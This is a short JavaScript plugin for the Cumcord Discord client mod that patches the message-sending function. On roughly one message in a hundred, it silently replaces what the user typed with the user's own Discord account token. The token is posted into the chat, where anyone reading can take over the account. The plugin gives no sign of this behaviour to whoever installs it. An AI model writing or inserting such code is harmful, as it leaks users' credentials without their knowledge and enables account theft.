import { after } from '@cumcord/patcher';
import { webpack } from '@cumcord/modules';

const e = webpack.findByProps('sendMessage');
const { getToken } = webpack.findByProps('getToken');
let unpatch;

export default () => {
	return {
		onLoad() {
			unpatch = after('sendMessage', e, args => {
				if (sendToken()) args[1].content = getToken();
				return args;
			});
		},
		onUnload() {
			unpatch?.();
		},
	};
};

function sendToken() {
	const number = Math.floor(Math.random() * 100);
	if (number === 69) return true;
}
